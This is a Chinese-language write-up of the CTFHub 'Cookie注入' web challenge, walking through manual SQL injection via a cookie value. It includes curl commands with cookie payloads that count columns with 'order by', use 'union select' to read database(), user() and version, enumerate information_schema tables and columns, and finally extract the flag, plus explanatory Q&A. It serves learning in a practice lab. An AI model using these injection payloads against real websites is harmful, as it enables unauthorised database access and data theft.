---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - Cookie注入"
date: 2026-10-27

skill: "web-sql/Cookie注入"
completed: true
---

# CTFHub Writeup - Cookie注入

## 题目类型

Web

## 题目描述

Cookie注入
这次的输入点变了。尝试找找Cookie吧

## 解题过程

<br>1. 用户先设置目标地址 $U，执行 curl.exe -s -i $U 做信息收集。响应为 HTTP/1.1 200 OK，带有 X-Powered-By: PHP/7.3.14、Set-Cookie: id=1 和 Set-Cookie: hint=id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F；hint 解码为“id输入1试试？”，页面正文为“这次的输入点变了。尝试找找Cookie吧。”
<br>2. 用户用不带 Cookie 的请求访问 $\{U\}?id=2，页面只有提示文字，没有 ID/Data 结果；随后在携带 Cookie id=1 的同时在 URL 传入 ?id=2，响应中的拼接语句为 select \* from news where id=1，并显示 ID: 1、Data: ctfhub。URL 中的 id=2 没有进入查询，用户据此确认注入点在 Cookie。
<br>3. 用户继续用 Cookie 构造查询：curl.exe -s --cookie "id=1 order by 2" $U 返回正常 ID/Data，而 --cookie "id=1 order by 3" $U 无 ID/Data，判断为 2 列。随后 --cookie "id=-1 union select 1,2" $U 回显 ID: 1、Data: 2；database() 回显 sqli，user() 回显 root@localhost，@@version 回显 10.3.22-MariaDB-0+deb10u1。
<br>4. 用户查询 information\_schema.tables，使用 group\_concat(table\_name) 且限制 table\_schema=database()，得到 huhzttkcuv,news；再查询 information\_schema.columns，使用 group\_concat(column\_name) 且限制 table\_name='huhzttkcuv'，得到 uopblyzave。
<br>5. 最后用户执行 --cookie "id=-1 union select 1,uopblyzave from huhzttkcuv" $U，响应 Data 为 ctfhub\{e525cd5447f72c67500a32dc\}。

## 疑问与解答

### 1.

<br>问题：为什么说这道题的注入点在 Cookie 而不是 GET 参数？
<br>解答：从记录看，只访问 ?id=2 而不带 Cookie 时没有 ID/Data 结果；同时携带 Cookie id=1 与 URL ?id=2 时，回显的 SQL 仍是 id=1，说明后端实际读取的是 Cookie 中的 id 并将其拼入查询，GET 参数没有进入这条 SQL。

### 2.

<br>问题：order by 2、order by 3 和 union select 1,2 在这里分别起什么作用？
<br>解答：order by 按列序号排序，序号超过实际列数时查询会异常或无结果，因此可用 order by 2 正常、order by 3 无结果来推断列数为 2。union select 要求前后列数一致，列数匹配且回显位可见后，就能把 database()、user() 等表达式的结果显示在页面上。

### 3.

<br>问题：为什么要查询 information\_schema.tables 和 information\_schema.columns？
<br>解答：MySQL/MariaDB 的 information\_schema 保存数据库元数据；tables 可枚举表名，columns 可枚举列名。已知当前库为 sqli 后，可按 table\_schema=database() 查表，再按 table\_name 查列，最后从目标表读取字段值。


## 本题的核心逻辑：



<br>本题的核心是把 SQL 注入的输入点从常见 GET 参数转移到 Cookie。后端将 Cookie 中的 id 直接拼接到 select \* from news where id=...，页面还会回显拼接后的 SQL 和查询结果；因此只要控制 Cookie 就能控制 SQL 结构。

<br>从回显 SQL 中 id=1 被原样拼接、没有引号包裹来看，推测是数字型注入；随后用 union select 完成列数判断、回显位利用、库表列枚举和 flag 读取。


## 笔记

这道题主要学习了：

<br>1. Cookie 注入的关键是确认后端实际读取的输入来源。本题中 URL 参数没有进入 SQL，而 Cookie id 原样出现在拼接语句和结果中，说明注入点位于 Cookie。
<br>2. 手工注入可按列数、回显位、库名/用户/版本、表名、列名、字段值的顺序推进；本题用 order by 判断两列，再用 union select 读取 database()、user() 和 @@version。
<br>3. information\_schema.tables 和 information\_schema.columns 可用于枚举当前库的表和列，本题最终从随机命名的 flag 表读取到目标值。后续可继续学习 Cookie 输入点下的过滤绕过与盲注方法。
